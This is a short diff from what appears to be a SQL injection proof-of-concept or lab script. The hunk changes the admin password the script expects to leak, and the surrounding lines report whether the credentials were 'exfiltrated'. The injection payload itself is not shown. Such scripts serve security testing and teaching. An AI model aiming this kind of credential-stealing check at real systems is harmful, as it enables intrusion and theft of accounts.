@@ -46,7 +46,7 @@ def main():
         print("    ", row)
 
     leaked = {tuple(r) for r in out["results"]}
-    if ("admin", "S3cr3t-Meridian-Admin!") in leaked:
+    if ("admin", "S3cr3t-Adm1n-Pw!") in leaked:
         print("\n[+] Success: admin credentials exfiltrated via SQL injection.")
     else:
         raise SystemExit("[-] Injection did not leak the expected credentials.")
